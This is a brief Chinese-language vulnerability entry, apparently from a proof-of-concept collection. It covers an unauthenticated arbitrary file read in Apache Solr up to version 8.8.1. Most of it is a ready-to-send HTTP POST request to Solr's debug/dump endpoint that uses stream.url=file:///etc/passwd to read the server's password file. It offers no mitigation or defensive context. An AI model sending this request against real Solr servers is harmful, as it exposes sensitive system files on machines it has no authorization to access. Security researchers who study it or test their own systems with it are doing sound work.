### 描述
Apache Solr 存在任意文件读取漏洞，攻击者可以在未授权的情况下获取目标服务器敏感文件。  
影响版本：Apache Solr <= 8.8.1
### POC &EXP
构造读取/etc/passwd的包
```html
POST /solr/demo/./debug/dump?param=ContentStreams HTTP/1.1
Host: 127.0.0.1:8983
Content-Length: 29
Content-Type: application/x-www-form-urlencoded
Connection: close
 
stream.url=file:///etc/passwd
```
